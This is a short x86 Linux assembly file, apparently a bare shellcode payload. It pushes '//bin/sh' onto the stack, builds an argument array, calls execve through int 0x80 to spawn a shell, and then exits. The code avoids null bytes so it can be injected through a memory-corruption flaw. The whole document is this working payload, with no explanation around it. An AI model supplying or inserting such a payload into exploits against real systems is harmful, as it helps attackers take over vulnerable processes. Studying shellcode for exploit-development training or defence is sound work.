section .text
    global _start

_start:
    xor eax, eax
    push eax            ; NULL
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi 

    mov esi, esp        ; esp is args
    xor edx, edx        ; edx is NULL
    push edx
    push esi

    mov ecx, esp        ; address of args array
    mov ebx, esi        ; "/bin/sh"
    mov al, 0xb
    int 0x80

    xor ebx, ebx
    xor eax, eax
    inc eax
    int 0x80
